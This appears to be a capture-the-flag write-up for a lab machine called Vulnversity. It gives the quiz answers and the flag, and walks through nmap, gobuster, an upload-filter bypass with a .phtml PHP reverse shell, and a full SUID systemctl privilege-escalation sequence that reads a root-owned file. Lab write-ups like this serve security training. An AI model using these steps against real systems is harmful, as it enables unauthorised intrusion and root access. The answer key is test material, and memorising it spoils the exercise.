# Vulnversity

```
export ip=10.10.214.176
```
## Nmap scan in `nmap/initial`

> Scan the box, how many ports are open?

```
6
```

> What version of the squid proxy is running on the machine?

```
3.5.12
```

> How many ports will nmap scan if the flag -p-400 was used?

```
400
```

> Using the nmap flag -n what will it not resolve?

```
dns
```

> What is the most likely operating system this machine is running?

```
Ubuntu
```

> What port is the web server running on?

```
3333
```



## Gobuster on port `3333` yielded route `/internal` - might be interesting

> What is the directory that has an upload form page?

```
/internal
```

## Burpsuite find allowed extension

> Found allowed extension `.phtml`

## Uploaded `php-reverse-shell.phtml` to the `/internal` upload page of the server

> Received reverse shell

## Privelage escalation

> Found `/bin/systemctl` through this command: `find / -user root -perm /4000 2>/dev/null`

> Exploited it through setting up a service to output the flag into another file that the `www-data` user could access (`/tmp/flag.txt`)

```

touch /tmp/getflag.sh

chmod u+x /tmp/getflag.sh
echo "cat /root/root.txt > /tmp/flag.txt" >> /tmp/getflag.sh

echo "[Unit]

Description=Example systemd service.

[Service]

Type=simple

ExecStart=/bin/bash /tmp/getflag.sh

[Install]

WantedBy=multi-user.target" > /tmp/1313.service

systemctl enable /tmp/1313.service

systemctl start 1313

cat /tmp/flag.txt => a58ff8579f0a9270368d33a9966c7fd5
```

> Become root and get the last flag (/root/root.txt)

```
a58ff8579f0a9270368d33a9966c7fd5
```